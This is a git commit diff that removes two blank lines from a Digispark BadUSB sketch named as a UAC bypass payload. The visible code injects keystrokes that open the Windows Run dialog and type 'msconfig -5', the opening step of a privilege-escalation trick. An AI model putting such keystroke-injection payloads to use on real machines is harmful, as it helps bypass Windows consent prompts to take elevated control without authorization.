d5c615a4df0036ae7d669b3116c337be5c5e268b
Shreyas Saunshi <67939784+ShreyasSaunshi@users.noreply.github.com>
2023-03-10 18:46:50 +0530

    Update UAC_BYPASS_MSCONFIG.ino

--- Payloads/UAC Bypass/UAC_BYPASS_MSCONFIG.ino
+++ Payloads/UAC Bypass/UAC_BYPASS_MSCONFIG.ino
@@ -5,11 +5,9 @@ void setup() {
 }
 
 void loop() {
-   
   DigiKeyboard.update();
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(3000);
- 
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
   DigiKeyboard.delay(100);
   DigiKeyboard.println("msconfig -5"); //starting msconfig
